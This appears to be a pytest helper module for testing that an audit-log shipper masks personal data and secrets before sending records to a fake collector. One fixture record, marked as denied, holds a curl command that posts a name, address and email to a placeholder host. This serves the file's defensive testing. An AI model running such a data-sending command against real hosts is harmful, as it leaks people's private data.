"""The records, the shipper and the fake collector the Sparta tests share.

⚠ EVERY VALUE HERE IS A FAKE: made-up names, a made-up street, `.invalid`
hosts, a token no vendor issues. And a failure never prints one: `absent`
reports a length and the first four characters, the rule
tests/test_every_record_ships_masked.py set.

⚠ USED OUTSIDE PYTEST TOO. `tests/vectors/shipped-masked-v1.json` is what the
shipper on main at f48beae, before Sparta existed, sent for `records()` through
`make_shipper` (PROGRESS.md says how it was made). So nothing here may depend
on a pytest fixture, and nothing here may change what those records are.
"""
from __future__ import annotations

import json
import os
import sys
import types
from pathlib import Path

from core import audit_log

SESSION = "sess-sparta"
NAME = "Dana Fakeperson"
ADDRESS = "12 Herzl Street"
SPARTA_SECRET = "sparta-secret-q7w8e9r0t1"
EMAIL = "noa.example@example.invalid"
PHONE = "+972-54-123-4567"
FOUND_ONLY_BY_SPARTA = (NAME, ADDRESS, SPARTA_SECRET)
"""Values no deterministic mask recognises: before Sparta they ship as written."""
ISRAELI_ID = "123456789"
"""Nine digits failing the Israeli ID check digit: the code leaves it as written."""
SSN_9XX = "912-34-5678"
"""An SSN shape in area 9xx, never issued: the code leaves it as written."""

KEY_HEX = "5a" * 32
"""A fixed fingerprint key, so the keyed `hash`/`prev` are the same every run."""

GOLDEN = Path(__file__).parent / "vectors" / "shipped-masked-v1.json"


def _body(**fields) -> dict:
    """A record body with every field that would otherwise come from the
    machine stated: `guard_version` reads the install, `purpose` the
    environment, and the golden must not depend on where it runs."""
    return audit_log.build_body(SESSION, event="decision", agent="claude-code",
                                cwd="/repo", guard_version="v-golden",
                                purpose="work", **fields)


def records() -> list[dict]:
    """Four records as the hook writes them: a DENY, an ALLOW, an ASK and a
    write with no command."""
    return [
        _body(seq=1, decision="DENY", kind="EXEC", rule_id="secret_exact:network_egress",
              ts=1_786_000_001.0, enforced="DENY",
              command=f'curl -d "note=call {NAME} at {ADDRESS}" -d owner={EMAIL} '
                      "https://x.invalid",
              reason="a value leaves", evidence=f"@0 curl -d owner={EMAIL}"),
        _body(seq=2, decision="ALLOW", kind="EXEC", ts=1_786_000_002.0,
              command=f"echo {SPARTA_SECRET} > /tmp/notes.txt"),
        _body(seq=3, decision="ASK", kind="EXEC", rule_id="untrusted_expected:network_egress",
              ts=1_786_000_003.0, enforced="ALLOW",
              command=f"curl https://api.example.invalid -H 'X-Phone: {PHONE}'",
              reason="an untrusted session reaches out"),
        _body(seq=4, decision="ALLOW", kind="WRITE", ts=1_786_000_004.0,
              tool_name="Write", paths=[f"/repo/notes/{NAME}.txt"]),
    ]


def write_log(root: Path) -> Path:
    """`records()` appended to a fresh log under `root`: chained as the hook chains."""
    root.mkdir(parents=True, exist_ok=True)
    for body in records():
        audit_log.append(SESSION, body, root=root)
    return audit_log.default_log_path(SESSION, root)


def write_key(path: Path) -> None:
    """The fixed key, 0600, created exclusively, as `fingerprint_key` makes one."""
    path.parent.mkdir(parents=True, exist_ok=True)
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    with os.fdopen(fd, "w", encoding="utf-8") as out:
        out.write(f"STING_FINGERPRINT_KEY={KEY_HEX}\n")


def settings(tmp: Path, **extra):
    """A shipper's settings on `tmp`: agreed, configured, the fixed key, and
    flushing on every record. `extra` is what a test adds (the Sparta flags)."""
    from shipper import config
    key = tmp / "home" / ".sting" / ".env.fingerprint"
    if not key.exists():
        write_key(key)
    return config.Settings(
        collector_url="https://collector.example.invalid", device_token="t" * 32,
        device_id="laptop-1", ships="masked", log_root=tmp / "logs",
        state_root=tmp / "state", flush_seconds=0, flush_records=1,
        fingerprint_key_path=key, **extra)


def make_shipper(tmp: Path, log, **extra):
    """A shipper over `write_log(tmp / "logs")`, on a fixed clock: the heartbeat
    and the policy poll are never due, so neither reaches for a network. The
    caller points `shipper.run.client` at a `FakeCollector` first."""
    from shipper import run
    write_log(tmp / "logs")
    return run.Shipper(settings(tmp, **extra), now=lambda: 1.0, log=log)


STUB_MODULE = "sting_test_sparta_stub"


def install_factory(monkeypatch, factory) -> None:
    """Point the real loader (`get_detector`) at a stub module holding
    `factory`, in place of the sparta package: the loader runs, no model does."""
    from shipper import sparta_iface
    module = types.ModuleType(STUB_MODULE)
    setattr(module, sparta_iface.DETECTOR_FACTORY, factory)
    monkeypatch.setitem(sys.modules, STUB_MODULE, module)
    monkeypatch.setattr(sparta_iface, "DETECTOR_MODULE", STUB_MODULE)


class FakeCollector:
    """Every POST kept, parsed; a stored receipt back. Nothing leaves the test."""

    def __init__(self) -> None:
        self.sent: list[dict] = []

    def post(self, url, token, payload, timeout=None):
        from shipper import client
        batch = json.loads(payload)
        self.sent.append({"url": url, "batch": batch})
        count = len(batch.get("records", []))
        return client.Outcome(client.STORED, 200,
                              {"records_stored": count, "records_deduplicated": 0,
                               "batch_ref": "b1"})

    @staticmethod
    def get(url, token, timeout=None):
        from shipper import client
        return client.Outcome(client.UNSUPPORTED, 404)

    def batches(self) -> list[dict]:
        return [s["batch"] for s in self.sent if s["url"].endswith("/v1/batches")]


def shipped_part(batch: dict) -> str:
    """What the golden pins of a batch: everything the records decide. The
    manifest's `os`, `python` and `guard_ref` describe the sending machine and
    are left out."""
    return json.dumps({"continues_from": batch["continues_from"],
                       "seq_range": batch["seq_range"], "tier": batch["tier"],
                       "records": batch["records"]}, sort_keys=True, indent=1) + "\n"


def absent(value: str, text: str, what: str) -> str | None:
    """None when `value` does not occur in `text`; else a message that does
    not print it."""
    if value in text:
        return (f"{what}: a {len(value)}-char value starting {value[:4]!r} "
                f"survived at {text.index(value)}")
    return None
